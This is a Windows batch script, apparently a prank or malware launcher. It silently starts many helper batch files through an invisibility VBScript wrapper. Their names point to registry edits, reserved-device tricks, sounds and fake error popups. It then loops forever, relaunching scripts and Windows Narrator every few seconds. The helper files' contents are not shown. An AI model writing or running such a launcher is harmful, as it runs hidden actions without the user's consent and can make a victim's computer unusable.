@echo off
CD /D "%~dp0"

wscript.exe "%~dp0\invis.vbs" "%~dp0\short.bat"

timeout /t 15 /nobreak >nul

wscript.exe "%~dp0\invis.vbs" "%~dp0\reggie.bat"
wscript.exe "%~dp0\invis.vbs" "%~dp0\time.bat"
wscript.exe "%~dp0\invis.vbs" "%~dp0\vol.bat"
wscript.exe "%~dp0\invis.vbs" "%~dp0\shell1.bat"
wscript.exe "%~dp0\invis.vbs" "%~dp0\shell2.bat"
wscript.exe "%~dp0\invis.vbs" "%~dp0\shell3.bat"
wscript.exe "%~dp0\invis.vbs" "%~dp0\shell4.bat"
wscript.exe "%~dp0\invis.vbs" "%~dp0\shell5.bat"
wscript.exe "%~dp0\invis.vbs" "%~dp0\shell6.bat"
wscript.exe "%~dp0\invis.vbs" "%~dp0\shell7.bat"
wscript.exe "%~dp0\invis.vbs" "%~dp0\foto.bat"
::wscript.exe "%~dp0\invis.vbs" "%~dp0\sound1.bat"
wscript.exe "%~dp0\invis.vbs" "%~dp0\sound2.bat"
wscript.exe "%~dp0\invis.vbs" "%~dp0\sound3.bat"
::wscript.exe "%~dp0\invis.vbs" "%~dp0\sound4.bat"
wscript.exe "%~dp0\invis.vbs" "%~dp0\sound5.bat"
wscript.exe "%~dp0\invis.vbs" "%~dp0\exp.bat"
wscript.exe "%~dp0\invis.vbs" "%~dp0\coraux.bat"
wscript.exe "%~dp0\invis.vbs" "%~dp0\corcon.bat"
wscript.exe "%~dp0\invis.vbs" "%~dp0\corprn.bat"

:loop
wscript.exe "%~dp0\invis.vbs" "%~dp0\start.bat"
wscript.exe "%~dp0\invis.vbs" "%~dp0\lang.bat"
narrator
wscript.exe "%~dp0\invis.vbs" "%~dp0\error1.bat"
wscript.exe "%~dp0\invis.vbs" "%~dp0\error2.bat"
wscript.exe "%~dp0\invis.vbs" "%~dp0\error3.bat"
wscript.exe "%~dp0\invis.vbs" "%~dp0\error4.bat"
wscript.exe "%~dp0\invis.vbs" "%~dp0\error5.bat"

timeout /t 3 /nobreak >nul

goto loop
